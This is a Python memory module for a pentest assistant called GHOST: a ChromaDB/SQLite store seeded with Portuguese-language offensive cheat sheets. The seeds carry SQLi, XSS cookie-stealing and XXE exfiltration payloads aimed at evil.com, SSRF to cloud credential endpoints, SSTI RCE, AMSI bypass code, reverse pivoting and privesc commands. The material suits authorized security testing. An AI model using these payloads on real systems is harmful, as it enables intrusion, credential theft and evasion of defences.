"""
GHOST Memory v3
ChromaDB (vetorial) + SQLite (metadados, sessões, feedback, runs GHOSTRECON)
"""

import chromadb
from chromadb.config import Settings
import json, re, uuid, sqlite3, os, logging
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Tuple
import httpx

DB_PATH = Path("./ghost_data")
DB_PATH.mkdir(exist_ok=True)

logger = logging.getLogger("ghost.memory")

def _ollama_url_force_ipv4_loopback(url: str) -> str:
    """Evita localhost → ::1 quando o Ollama só escuta em 127.0.0.1."""
    s = str(url or "").strip()
    return re.sub(r"(?i)(https?://)localhost(:\d+)?(?=/|$)", r"\g<1>127.0.0.1\2", s)


def _default_ollama_embed_url() -> str:
    base = (os.getenv("GHOST_OLLAMA_URL") or os.getenv("OLLAMA_HOST") or "").strip().rstrip("/")
    if base and not base.startswith(("http://", "https://")):
        base = "http://" + base.lstrip("/")
    if base:
        return _ollama_url_force_ipv4_loopback(f"{base}/api/embeddings")
    return "http://127.0.0.1:11434/api/embeddings"


OLLAMA_EMBED_URL = _ollama_url_force_ipv4_loopback(
    os.getenv("GHOST_OLLAMA_EMBED_URL", _default_ollama_embed_url()),
).strip()
EMBED_MODEL = os.getenv("GHOST_EMBED_MODEL", "nomic-embed-text").strip()

# Categorias gravadas por save_feedback → memória vetorial (usadas em search_feedback).
FEEDBACK_MEM_CATEGORIES: Tuple[str, ...] = ("feedback_approved", "feedback_correction")


def embedding_strict_enabled() -> bool:
    return os.getenv("GHOST_EMBEDDING_STRICT", "").strip().lower() in ("1", "true", "yes", "on")


def embeddings_api_ok(timeout: float = 3.0) -> bool:
    """Probe rápido: Ollama responde /api/embeddings com vetor válido."""
    try:
        r = httpx.post(
            OLLAMA_EMBED_URL,
            json={"model": EMBED_MODEL, "prompt": "health"},
            timeout=timeout,
        )
        if not r.is_success:
            return False
        data = r.json()
        emb = data.get("embedding")
        return isinstance(emb, list) and len(emb) > 0
    except Exception as e:
        logger.debug("embeddings_api_ok: %s", e)
        return False


def _hash_embed(text: str, dim: int = 768) -> list:
    import hashlib
    h = hashlib.sha256(text.encode()).digest()
    base = [(b / 255.0 - 0.5) * 2 for b in h]
    return [base[i % len(base)] * (1 + i * 0.0001) for i in range(dim)]


def _ollama_embedding_vector(text: str) -> Optional[list]:
    try:
        r = httpx.post(
            OLLAMA_EMBED_URL,
            json={"model": EMBED_MODEL, "prompt": text[:3000]},
            timeout=30,
        )
        if not r.is_success:
            logger.warning(
                "Ollama embeddings HTTP %s: %s",
                r.status_code,
                (r.text or "")[:200],
            )
            return None
        data = r.json()
        emb = data.get("embedding")
        if isinstance(emb, list) and emb:
            return emb
        logger.warning("Ollama embeddings sem vetor (keys=%s)", list(data.keys())[:12])
    except Exception as e:
        logger.warning("Ollama embeddings falhou: %s", e)
    return None


def get_embedding(text: str) -> list:
    emb = _ollama_embedding_vector(text)
    if emb is not None:
        return emb
    if embedding_strict_enabled():
        logger.error(
            "GHOST_EMBEDDING_STRICT=1 e embeddings indisponíveis; recusa fallback sintético."
        )
        raise RuntimeError(
            "Embeddings Ollama indisponíveis com GHOST_EMBEDDING_STRICT=1. "
            "Inicie `ollama serve` e confirme o modelo `nomic-embed-text`, ou desative o strict."
        )
    logger.warning(
        "Usando fallback _hash_embed (RAG semanticamente degradado). "
        "Corrija Ollama/embeddings ou defina GHOST_EMBEDDING_STRICT=1 para falhar explicitamente."
    )
    return _hash_embed(text)


class GhostMemory:

    def __init__(self):
        self.chroma = chromadb.PersistentClient(
            path=str(DB_PATH / "chroma"),
            settings=Settings(anonymized_telemetry=False)
        )
        self.col = self.chroma.get_or_create_collection(
            name="ghost_v3",
            metadata={"hnsw:space": "cosine"}
        )
        self.db = DB_PATH / "ghost.db"
        self._init_db()
        if self.count() == 0:
            self._seed()
        # Garante baseline mesmo em instalações já existentes (expande memória além do seed inicial).
        self._ensure_core_knowledge()

    def embeddings_reachable(self) -> bool:
        """True se POST /api/embeddings devolve vetor (para health / painéis)."""
        return embeddings_api_ok()

    # ── INIT DB ──
    def _init_db(self):
        c = self._conn()
        c.executescript("""
        CREATE TABLE IF NOT EXISTS memory_meta (
            id TEXT PRIMARY KEY,
            topic TEXT,
            category TEXT,
            tags TEXT DEFAULT '[]',
            source TEXT DEFAULT 'manual',
            created_at TEXT,
            updated_at TEXT,
            access_count INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS feedback (
            id TEXT PRIMARY KEY,
            session_id TEXT,
            question TEXT,
            answer TEXT,
            rating INTEGER,
            correction TEXT,
            created_at TEXT
        );
        CREATE TABLE IF NOT EXISTS sessions (
            id TEXT PRIMARY KEY,
            title TEXT,
            messages TEXT,
            model TEXT,
            params TEXT,
            created_at TEXT,
            updated_at TEXT,
            msg_count INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS ghostrecon_runs (
            id TEXT PRIMARY KEY,
            domain TEXT,
            profile TEXT,
            findings_count INTEGER DEFAULT 0,
            data TEXT,
            created_at TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_meta_cat    ON memory_meta(category);
        CREATE INDEX IF NOT EXISTS idx_meta_src    ON memory_meta(source);
        CREATE INDEX IF NOT EXISTS idx_meta_access ON memory_meta(access_count DESC);
        CREATE INDEX IF NOT EXISTS idx_runs_domain ON ghostrecon_runs(domain);
        CREATE INDEX IF NOT EXISTS idx_runs_date   ON ghostrecon_runs(created_at DESC);
        CREATE INDEX IF NOT EXISTS idx_sess_date   ON sessions(updated_at DESC);
        """)
        c.commit()
        c.close()

    def _conn(self):
        c = sqlite3.connect(self.db)
        c.row_factory = sqlite3.Row
        return c

    # ── CRUD MEMÓRIA ──
    def add(self, topic: str, content: str, category: str = "general",
            tags: list = [], source: str = "manual") -> str:
        doc_id = str(uuid.uuid4())
        emb    = get_embedding(f"{topic}: {content}")
        now    = datetime.now().isoformat()

        self.col.add(
            ids=[doc_id], embeddings=[emb], documents=[content],
            metadatas=[{"topic": topic, "category": category,
                        "tags": json.dumps(tags), "source": source, "created_at": now}]
        )
        c = self._conn()
        c.execute("INSERT INTO memory_meta VALUES (?,?,?,?,?,?,?,?)",
                  (doc_id, topic, category, json.dumps(tags), source, now, now, 0))
        c.commit(); c.close()
        return doc_id

    def search(self, query: str, n_results: int = 6,
               category: Optional[str] = None) -> list:
        total = self.count()
        if total == 0 or n_results == 0: return []
        emb = get_embedding(query)
        n   = min(n_results, total)
        kw  = dict(query_embeddings=[emb], n_results=n,
                   include=["documents","metadatas","distances"])
        if category: kw["where"] = {"category": category}
        try:
            res = self.col.query(**kw)
        except: return []

        docs = []
        for i, doc in enumerate(res["documents"][0]):
            dist = res["distances"][0][i]
            if dist < 0.88:
                m = res["metadatas"][0][i]
                docs.append({
                    "id":        res["ids"][0][i],
                    "content":   doc,
                    "topic":     m.get("topic",""),
                    "category":  m.get("category","general"),
                    "tags":      json.loads(m.get("tags","[]")),
                    "source":    m.get("source","manual"),
                    "relevance": round(1 - dist, 4)
                })

        if docs:
            c = self._conn()
            for d in docs:
                c.execute("UPDATE memory_meta SET access_count=access_count+1, updated_at=? WHERE id=?",
                          (datetime.now().isoformat(), d["id"]))
            c.commit(); c.close()

        return sorted(docs, key=lambda x: x["relevance"], reverse=True)

    def _search_feedback_fallback(self, query: str, n_results: int, emb: list) -> list:
        """Se o filtro Chroma `$in` falhar, filtra categorias de feedback em memória."""
        total = self.count()
        if total == 0 or n_results <= 0:
            return []
        n = min(max(n_results * 6, 12), total)
        try:
            res = self.col.query(
                query_embeddings=[emb],
                n_results=n,
                include=["documents", "metadatas", "distances"],
            )
        except Exception as e:
            logger.warning("search_feedback fallback query falhou: %s", e)
            return []

        cats = set(FEEDBACK_MEM_CATEGORIES)
        docs: List[dict] = []
        for i, doc in enumerate(res["documents"][0]):
            dist = res["distances"][0][i]
            m = res["metadatas"][0][i]
            if m.get("category") not in cats:
                continue
            if dist >= 0.88:
                continue
            docs.append({
                "id":        res["ids"][0][i],
                "content":   doc,
                "topic":     m.get("topic", ""),
                "category":  m.get("category", "general"),
                "tags":      json.loads(m.get("tags", "[]")),
                "source":    m.get("source", "manual"),
                "relevance": round(1 - dist, 4),
            })
        docs = sorted(docs, key=lambda x: x["relevance"], reverse=True)[:n_results]
        if docs:
            c = self._conn()
            for d in docs:
                c.execute(
                    "UPDATE memory_meta SET access_count=access_count+1, updated_at=? WHERE id=?",
                    (datetime.now().isoformat(), d["id"]),
                )
            c.commit()
            c.close()
        return docs

    def search_feedback(self, query: str, n_results: int = 4) -> list:
        """
        RAG só sobre memória gerada a partir de feedback (correções / preferências aprovadas).
        """
        if n_results <= 0 or not (query or "").strip():
            return []
        total = self.count()
        if total == 0:
            return []
        emb = get_embedding(query)
        n = min(max(n_results, 1), total)
        kw = dict(
            query_embeddings=[emb],
            n_results=n,
            include=["documents", "metadatas", "distances"],
            where={"category": {"$in": list(FEEDBACK_MEM_CATEGORIES)}},
        )
        try:
            res = self.col.query(**kw)
        except Exception as e:
            logger.warning("search_feedback: query com $in falhou (%s)", e)
            return self._search_feedback_fallback(query, n_results, emb)

        docs: List[dict] = []
        for i, doc in enumerate(res["documents"][0]):
            dist = res["distances"][0][i]
            if dist >= 0.88:
                continue
            m = res["metadatas"][0][i]
            docs.append({
                "id":        res["ids"][0][i],
                "content":   doc,
                "topic":     m.get("topic", ""),
                "category":  m.get("category", "general"),
                "tags":      json.loads(m.get("tags", "[]")),
                "source":    m.get("source", "manual"),
                "relevance": round(1 - dist, 4),
            })

        if docs:
            c = self._conn()
            for d in docs:
                c.execute(
                    "UPDATE memory_meta SET access_count=access_count+1, updated_at=? WHERE id=?",
                    (datetime.now().isoformat(), d["id"]),
                )
            c.commit()
            c.close()

        return sorted(docs, key=lambda x: x["relevance"], reverse=True)

    def get_all(self, category: Optional[str] = None, limit: int = 500) -> dict:
        if self.count() == 0: return {"items":[],"total":0}
        res   = self.col.get(include=["documents","metadatas"])
        items = []
        for i, doc in enumerate(res["documents"]):
            m = res["metadatas"][i]
            cat = m.get("category","general")
            if category and cat != category: continue
            items.append({"id": res["ids"][i], "content": doc, "topic": m.get("topic",""),
                          "category": cat, "tags": json.loads(m.get("tags","[]")),
                          "source": m.get("source","manual"), "created_at": m.get("created_at","")})
        return {"items": items[:limit], "total": len(items)}

    def delete(self, doc_id: str):
        self.col.delete(ids=[doc_id])
        c = self._conn(); c.execute("DELETE FROM memory_meta WHERE id=?", (doc_id,)); c.commit(); c.close()

    def count(self) -> int: return self.col.count()

    def count_by_category(self) -> list:
        c = self._conn()
        rows = c.execute("SELECT category,COUNT(*) n,SUM(access_count) hits FROM memory_meta GROUP BY category ORDER BY n DESC").fetchall()
        c.close()
        return [{"category":r[0],"count":r[1],"hits":r[2]} for r in rows]

    def top_accessed(self, n: int = 5) -> list:
        c = self._conn()
        rows = c.execute("SELECT topic,category,access_count FROM memory_meta ORDER BY access_count DESC LIMIT ?", (n,)).fetchall()
        c.close()
        return [{"topic":r[0],"category":r[1],"hits":r[2]} for r in rows]

    def export(self) -> dict:
        data = self.get_all(limit=9999)
        c = self._conn()
        fbs  = [dict(r) for r in c.execute("SELECT * FROM feedback").fetchall()]
        runs = [dict(r) for r in c.execute("SELECT id,domain,profile,findings_count,created_at FROM ghostrecon_runs").fetchall()]
        c.close()
        return {"version":"3.0","exported_at":datetime.now().isoformat(),
                "memory":data["items"],"feedback_count":len(fbs),"runs":runs}

    def import_data(self, data: dict) -> int:
        count = 0
        for item in data.get("memory",[]):
            self.add(topic=item.get("topic","imported"), content=item.get("content",""),
                     category=item.get("category","general"), tags=item.get("tags",[]), source="import")
            count += 1
        return count

    # ── FEEDBACK ──
    def save_feedback(self, question: str, answer: str, rating: int,
                      correction: Optional[str] = None, session_id: str = "default") -> str:
        fid = str(uuid.uuid4())
        c = self._conn()
        c.execute("INSERT INTO feedback VALUES (?,?,?,?,?,?,?)",
                  (fid, session_id, question, answer, rating, correction, datetime.now().isoformat()))
        c.commit(); c.close()

        if rating >= 4 and correction and len(correction) > 10:
            try:
                self.add(
                    topic=f"[Auto+] {question[:80]}",
                    content=correction,
                    category="feedback_approved",
                    source="auto",
                )
            except RuntimeError as e:
                logger.error("save_feedback: não indexou preferência no Chroma: %s", e)
        elif rating <= 2 and correction and len(correction) > 10:
            try:
                self.add(
                    topic=f"[Correção] {question[:80]}",
                    content=f"ERRADO: {answer[:150]}\nCORRETO: {correction}",
                    category="feedback_correction",
                    source="auto",
                )
            except RuntimeError as e:
                logger.error("save_feedback: não indexou correção no Chroma: %s", e)
        return fid

    def feedback_count(self) -> int:
        c = self._conn(); n = c.execute("SELECT COUNT(*) FROM feedback").fetchone()[0]; c.close(); return n

    # ── SESSÕES ──
    def save_session(self, sid: str, title: str, messages: list, model: str, params: dict):
        now = datetime.now().isoformat()
        c = self._conn()
        ex = c.execute("SELECT id FROM sessions WHERE id=?", (sid,)).fetchone()
        if ex:
            c.execute("UPDATE sessions SET title=?,messages=?,model=?,params=?,updated_at=?,msg_count=? WHERE id=?",
                      (title,json.dumps(messages),model,json.dumps(params),now,len(messages),sid))
        else:
            c.execute("INSERT INTO sessions VALUES (?,?,?,?,?,?,?,?)",
                      (sid,title,json.dumps(messages),model,json.dumps(params),now,now,len(messages)))
        c.commit(); c.close()

    def list_sessions(self) -> list:
        c = self._conn()
        rows = c.execute("SELECT id,title,model,msg_count,created_at,updated_at FROM sessions ORDER BY updated_at DESC").fetchall()
        c.close(); return [dict(r) for r in rows]

    def get_session(self, sid: str) -> Optional[dict]:
        c = self._conn(); row = c.execute("SELECT * FROM sessions WHERE id=?", (sid,)).fetchone(); c.close()
        if not row: return None
        d = dict(row); d["messages"]=json.loads(d["messages"]); d["params"]=json.loads(d["params"]); return d

    def delete_session(self, sid: str):
        c = self._conn(); c.execute("DELETE FROM sessions WHERE id=?", (sid,)); c.commit(); c.close()

    def sessions_count(self) -> int:
        c = self._conn(); n = c.execute("SELECT COUNT(*) FROM sessions").fetchone()[0]; c.close(); return n

    # ── GHOSTRECON RUNS ──
    def save_run(self, run_id: str, domain: str, data: dict,
                 findings_count: int = 0, profile: str = "standard"):
        now = datetime.now().isoformat()
        c = self._conn()
        ex = c.execute("SELECT id FROM ghostrecon_runs WHERE id=?", (run_id,)).fetchone()
        if ex:
            c.execute("UPDATE ghostrecon_runs SET domain=?,profile=?,findings_count=?,data=? WHERE id=?",
                      (domain, profile, findings_count, json.dumps(data, ensure_ascii=False), run_id))
        else:
            c.execute("INSERT INTO ghostrecon_runs VALUES (?,?,?,?,?,?)",
                      (run_id, domain, profile, findings_count,
                       json.dumps(data, ensure_ascii=False), now))
        c.commit(); c.close()

    def list_runs(self) -> list:
        c = self._conn()
        rows = c.execute("SELECT id,domain,profile,findings_count,created_at FROM ghostrecon_runs ORDER BY created_at DESC").fetchall()
        c.close(); return [dict(r) for r in rows]

    def get_run(self, run_id: str) -> Optional[dict]:
        c = self._conn(); row = c.execute("SELECT * FROM ghostrecon_runs WHERE id=?", (run_id,)).fetchone(); c.close()
        if not row: return None
        d = dict(row)
        try: d["data"] = json.loads(d["data"]); d.update(d.pop("data"))
        except: pass
        return d

    def runs_count(self) -> int:
        c = self._conn(); n = c.execute("SELECT COUNT(*) FROM ghostrecon_runs").fetchone()[0]; c.close(); return n

    # ── SEED ──
    def _core_seed_entries(self):
        return [
            ("SQLi – Payloads e bypass WAF", "Basic: ' OR '1'='1. Union: ' UNION SELECT null,table_name FROM information_schema.tables--. Error-based (MySQL): ' AND extractvalue(1,concat(0x7e,version()))--. Blind time: ' AND SLEEP(5)--. Stacked: '; DROP TABLE users--. Bypass WAF: /*!50000UNION*/SELECT, %09UNION%09SELECT, 'UN'||'ION'. Tool: sqlmap -u URL --dbs --batch --random-agent --tamper=space2comment,between,randomcase --level=5 --risk=3", "pentest"),
            ("XSS – Payloads e bypass CSP", "<script>alert(1)</script>. Event: <img src=x onerror=alert(1)>. Angular: {{constructor.constructor('alert(1)')()}}. SVG: <svg onload=alert(1)>. Bypass CSP: <script src=//cdnjs.cloudflare.com/...>. Cookie steal: fetch('//evil.com/?c='+document.cookie). DOM: location.href='javascript:alert(1)'. Tool: dalfox, xss_vibes", "pentest"),
            ("SSRF – Bypass e exploração", "Internal: http://127.0.0.1/admin. AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/. GCP: http://metadata.google.internal/computeMetadata/v1/ (Header: Metadata-Flavor: Google). Bypass IP: http://0x7f000001/, http://0177.1/, http://[::1]/. DNS rebind. SSRF→Redis: gopher://127.0.0.1:6379/_SET x '<?php system($_GET[c]);?>'", "pentest"),
            ("LFI – Wrappers e RCE", "../../../etc/passwd. Null byte (PHP<5.3): %00. php://filter/convert.base64-encode/resource=index.php. php://input + POST: <?php system($_GET['c']);?>. Log poisoning via User-Agent → /var/log/apache2/access.log. data://text/plain;base64,PD9waHAg.... phar:// deserialization", "pentest"),
            ("XXE – Internal e OOB", "Basic: <!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>. OOB DTD: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://evil.com/?x=%file;\">'>%eval;%exfil;. SSRF via XXE. Blind: error-based", "pentest"),
            ("JWT – Todos os ataques", "None alg: {'alg':'none'}. RS256→HS256 com pubkey como secret HMAC. kid injection: '../../../dev/null'. jwks spoofing. Weak secret: hashcat -a 0 -m 16500 token.txt wordlist.txt. jku/x5u manipulation. Tools: jwt_tool.py, jwt-editor (Burp ext)", "pentest"),
            ("IDOR – Metodologia completa", "Testar IDs em: URL path, query string, body JSON, headers X-User-ID, cookie, JWT payload, GraphQL arguments, websocket messages. Techs: int incrementar/decrementar, GUID→int, user_id→admin_id, trocar ownership. Horizontal (outro user) e vertical (admin). Automatizar: Burp Autorize, Intruder cluster bomb. BOLA em APIs REST", "pentest"),
            ("SSTI – Detecção e RCE", "{{7*7}}=49 (Jinja2/Twig). ${7*7} (Freemarker). #{7*7} (Thymeleaf). Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. {{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}}. Twig RCE. Tool: tplmap -u URL", "pentest"),
            ("HTTP Request Smuggling", "CL.TE: Content-Length correto, Transfer-Encoding: chunked malformado. TE.CL: TE primeiro. Detectar: turbo intruder, h2smuggler. Impacto: bypass auth, cache poison, XSS stored, session hijack. Técnica: prefixar request de outro usuário", "pentest"),
            ("Recon passivo – Pipeline completo", "1) subfinder -d alvo.com | httpx -title -status-code -tech-detect 2) amass enum -passive -d alvo.com 3) gau alvo.com | grep -v 'png\\|jpg\\|css' | uro 4) katana -u https://alvo.com -d 5 -jc 5) nuclei -t exposures/ -t misconfiguration/ -l urls.txt 6) crt.sh?q=%.alvo.com 7) Shodan: ssl.cert.subject.cn:alvo.com", "recon"),
            ("Nmap – Comandos avançados", "Full TCP: nmap -sV -sC -O -p- --min-rate 5000 -T4 IP -oA full. Stealth: nmap -sS -Pn --ttl 64 IP. UDP top100: nmap -sU --top-ports 100 --open IP. Scripts vuln: nmap --script 'vuln and not intrusive' IP. SMB: nmap --script smb-vuln* -p445 IP. NSE firewall bypass: --script firewall-bypass. Saída: -oA scan_$(date +%Y%m%d)", "recon"),
            ("AD – Enumeração e ataques", "BloodHound: SharpHound.exe -c All --zipfilename out.zip. ldapdomaindump. CrackMapExec: cme smb IP -u user -p pass --shares --users --groups. Kerbrute: kerbrute userenum -d domain.local users.txt --dc IP. ASREPRoast: GetNPUsers.py domain/ -dc-ip IP -usersfile users.txt. Kerberoasting: GetUserSPNs.py domain/user:pass -dc-ip IP -request", "pentest"),
            ("Pivoting – Chisel + Ligolo-ng", "Chisel server (atac): ./chisel server -p 8888 --reverse --auth user:pass. Client (vítima): ./chisel client --auth user:pass ATAC:8888 R:socks. proxychains.conf: socks5 127.0.0.1 1080. Ligolo-ng: mais estável, layer3 transparente. SSH dynamic: ssh -D 1080 -N -f user@jump. Nmap via proxychains: proxychains nmap -sT -Pn INTERNAL", "exploit"),
            ("Privesc Linux – Full checklist", "sudo -l (NOPASSWD). SUID: find / -perm -4000 2>/dev/null. Capabilities: getcap -r / 2>/dev/null. Cron: cat /etc/crontab && ls -la /etc/cron.*. Writable /etc/passwd ou /etc/shadow. PATH hijacking. NFS no_root_squash. Weak service perms. pspy64 para processos. linpeas.sh. Kernel: uname -a → searchsploit. Docker socket: ls -la /var/run/docker.sock", "exploit"),
            ("Privesc Windows – Full checklist", "whoami /priv (SeImpersonatePrivilege → PrintSpoofer/JuicyPotato/GodPotato). AlwaysInstallElevated: reg query HKLM/HKCU ...\\Installer. Unquoted paths: wmic service get name,pathname |findstr /i /v 'c:\\windows'. Weak service ACL: sc qc + accesschk.exe. AutoRuns. DLL hijacking. winPEAS.exe, PowerUp.ps1. Token impersonation. DPAPI: dpapi.py", "exploit"),
            ("AMSI Bypass – Técnicas 2024", "Patch mem: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true). Obfuscado com Invoke-Obfuscation. Forçar erro: [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',40).GetValue($null),0). PowerShell v2: powershell -version 2. CLM bypass.", "exploit"),
            ("Python – Ferramentas ofensivas", "Requests + proxy Burp: s=requests.Session(); s.proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}; s.verify=False. Impacket: from impacket.smbconnection import SMBConnection. Pwntools: from pwn import *; p=remote('IP',PORT); p.sendline(b'payload'); p.interactive(). Scapy: from scapy.all import *; send(IP(dst='IP')/TCP(dport=80)/Raw(b'GET / HTTP/1.1'))", "code"),
            ("Bash – Automação ofensiva", "Recon paralelo: for sub in $(cat subs.txt); do curl -sk -o /dev/null -w \"%{http_code} $sub\\n\" https://$sub; done &. Extrai URLs JS: grep -Eo 'https?://[^\"]+' app.js | sort -u. Brute dirs: while read d; do c=$(curl -sk -o /dev/null -w '%{http_code}' URL/$d); [ $c != 404 ] && echo \"$c $d\"; done < wordlist.txt. Loop masscan: masscan IP/24 -p80,443,8080,8443 --rate=1000", "code"),
            ("Bug Bounty – Metodologia HackerOne", "1. Scope: lê rules, define wildcard vs exact. 2. Recon: subfinder|httpx|katana|gau. 3. Nuclei: -t exposures/ -t cves/ -t misconfiguration/. 4. Manual: Burp, IDOR, auth logic. 5. Prioridade: SSRF→RCE, SQLi, auth bypass, IDOR critico, XSS stored. 6. Report: título descritivo, impacto real, CVSS v3 justificado, PoC step-by-step, screenshots, sugestão de fix. 7. Comunicação profissional, follow-up em 7 dias.", "pentest"),
            ("GHOSTRECON – Análise de findings", "Ao receber dados do GHOSTRECON: 1) Agrupa por severidade (CRITICAL>HIGH>MEDIUM). 2) Identifica clusters (mesmo subdomínio, mesmo parâmetro). 3) Busca cadeias: SSRF+IDOR, XSS+auth bypass, SQLi+file read. 4) Verifica score e evidências. 5) Prioriza pelo que tem exploit direto vs precisa de condições. 6) Mapeia MITRE ATT&CK: T1190 (exploit public-facing), T1592 (recon), T1078 (valid accounts). 7) Gera narrativa de ataque realista.", "pentest"),
            ("GHOSTRECON – Pipeline de fases", "Fases: input→subdomains→dns_enrichment→rdap→alive→surface→urls→params→js→dorks→secrets→verify→webshell_probe→sqlmap→kali→assets→score→shannon→pentestgpt→owasp→mitre→saveRun→delta_hot→done. Módulos key: verify_sqli_deep (evidência), micro_exploit, webshell_probe (heurístico), param_discovery_active, kali_nuclei, kali_ffuf, kali_nmap_aggressive. Evento NDJSON type=finding tem: type, severity, url, evidence, mitre, owasp.", "pentest"),
            ("CTF – Pwn com pwntools", "from pwn import *\ncontext(arch='amd64', os='linux', log_level='debug')\np = remote('IP', PORT)  # ou process('./vuln')\nelf = ELF('./vuln')\nlibc = ELF('./libc.so.6')\n# ROP chain\nrop = ROP(elf)\nrop.call(elf.plt['puts'], [elf.got['puts']])\nrop.call(elf.sym['main'])\npayload = b'A'*offset + rop.chain()\np.sendline(payload)\nleak = u64(p.recv(6).ljust(8,b'\\x00'))\nlibc_base = leak - libc.sym['puts']", "code"),
            ("Hashcat + John – Cracking", "Hashcat: -m 0 MD5, -m 100 SHA1, -m 1400 SHA256, -m 1000 NTLM, -m 5600 NetNTLMv2, -m 13100 Kerberos5, -m 3200 bcrypt, -m 22000 WPA2. Rules: -r best64.rule -r dive.rule. Mask 8chars: -a 3 ?a?a?a?a?a?a?a?a. Combinator: -a 1 dict1 dict2. John: --wordlist=rockyou.txt --rules=jumbo hash.txt. Unshadow: unshadow /etc/passwd /etc/shadow > combined.txt", "tool"),
            ("OWASP Top 10 2025 — A01 Broken Access Control", "Padrões: IDOR/BOLA, forced browsing, mass assignment, bypass de checks no backend, regras por frontend apenas. Testes: trocar IDs, role tampering, GraphQL object-level auth. Mitigar: checagem server-side por recurso/ação, deny-by-default, testes de autorização por endpoint.", "owasp2025"),
            ("OWASP Top 10 2025 — A02 Cryptographic Failures", "Padrões: dados sensíveis sem TLS forte, segredo hardcoded, cifra fraca/ECB, hash inseguro (MD5/SHA1), senha sem Argon2/bcrypt/scrypt. Mitigar: TLS moderno, KMS/secret manager, rotação de chaves, hash forte com salt, criptografia em repouso e trânsito.", "owasp2025"),
            ("OWASP Top 10 2025 — A03 Injection", "Padrões: concatenação em SQL/NoSQL/LDAP/OS command, eval inseguro, template injection, header injection. Mitigar: prepared statements, escaping contextual, allowlist de inputs, separação dados/comandos, políticas WAF como camada complementar.", "owasp2025"),
            ("OWASP Top 10 2025 — A04 Insecure Design", "Padrões: ausência de threat modeling, fluxos sem rate-limit/anti-automation, regras críticas só no cliente, trust boundary incorreta. Mitigar: secure-by-design, abuse cases, arquitetura por menor privilégio, controles compensatórios no domínio de negócio.", "owasp2025"),
            ("OWASP Top 10 2025 — A05 Security Misconfiguration", "Padrões: debug ligado em produção, CORS aberto, buckets públicos, headers ausentes, serviços expostos, permissões excessivas. Mitigar: hardening baseline, IaC com políticas, revisão contínua de configuração, scanners de postura.", "owasp2025"),
            ("OWASP Top 10 2025 — A06 Vulnerable and Outdated Components", "Padrões: libs sem patch, CVEs críticos conhecidos, dependências transitivas abandonadas, container base antigo. Mitigar: SBOM, SCA contínuo, pinning com atualização planejada, políticas de SLA para patching.", "owasp2025"),
            ("OWASP Top 10 2025 — A07 Identification and Authentication Failures", "Padrões: sessão previsível, MFA ausente em risco alto, reset de senha frágil, brute force sem lockout, JWT mal validado. Mitigar: MFA adaptativo, rotação de sessão, proteção de credenciais, políticas anti-enumeração e anti-bruteforce.", "owasp2025"),
            ("OWASP Top 10 2025 — A08 Software and Data Integrity Failures", "Padrões: CI/CD sem assinatura, update pipeline inseguro, desserialização insegura, download sem validação de integridade. Mitigar: assinatura/verificação de artefatos, SLSA, provenance, controles em cadeia de suprimentos.", "owasp2025"),
            ("OWASP Top 10 2025 — A09 Security Logging and Monitoring Failures", "Padrões: eventos críticos não logados, logs sem contexto de usuário/recurso, retenção insuficiente, ausência de alerta. Mitigar: trilha auditável, centralização SIEM, alertas de detecção, playbooks de resposta e métricas de cobertura.", "owasp2025"),
            ("OWASP Top 10 2025 — A10 Server-Side Request Forgery (SSRF)", "Padrões: fetch de URL externa sem validação, acesso a metadata cloud, DNS rebinding, protocolos perigosos (gopher/file). Mitigar: egress filtering, allowlist de destinos, bloqueio de RFC1918/link-local, parser seguro e timeout estrito.", "owasp2025"),
        ]

    def _seed(self):
        base = self._core_seed_entries()
        for topic, content, category in base:
            self.add(topic=topic, content=content, category=category, source="seed")
        print(f"[GHOST v3] Seed: {len(base)} entradas")

    def _ensure_core_knowledge(self):
        """Adiciona entradas core ausentes sem duplicar por topic."""
        c = self._conn()
        existing = {
            r[0] for r in c.execute(
                "SELECT topic FROM memory_meta WHERE source IN ('seed','baseline','owasp2025_seed')"
            ).fetchall()
        }
        c.close()

        added = 0
        for topic, content, category in self._core_seed_entries():
            if topic in existing:
                continue
            src = "owasp2025_seed" if category == "owasp2025" else "baseline"
            self.add(topic=topic, content=content, category=category, source=src)
            added += 1

        if added:
            print(f"[GHOST v3] Baseline expandida: +{added} entradas")
